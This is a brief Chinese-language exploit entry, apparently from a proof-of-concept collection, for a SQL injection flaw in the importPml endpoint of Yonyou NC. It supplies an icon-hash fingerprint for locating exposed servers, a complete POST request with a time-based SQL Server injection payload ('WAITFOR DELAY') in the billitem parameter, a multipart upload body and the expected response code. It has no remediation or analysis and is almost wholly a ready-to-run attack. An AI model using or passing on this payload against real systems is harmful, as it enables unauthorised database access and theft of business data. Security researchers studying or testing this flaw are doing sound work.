# 用友NCimportPmlSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="1085941792"`
- **请求**：`POST /portal/pt/portalpage/importPml?pageId=login&billitem=1'WAITFOR+DELAY+'0:0:5'-- HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryH970hbttBhoCyj9V
Content-Disposition: form-data; name="Filedata"; filename="1.jpg"
Content-Type: image/jpeg
------WebKitFormBoundaryH970hbttBhoCyj9V--
```
- **响应特征**：200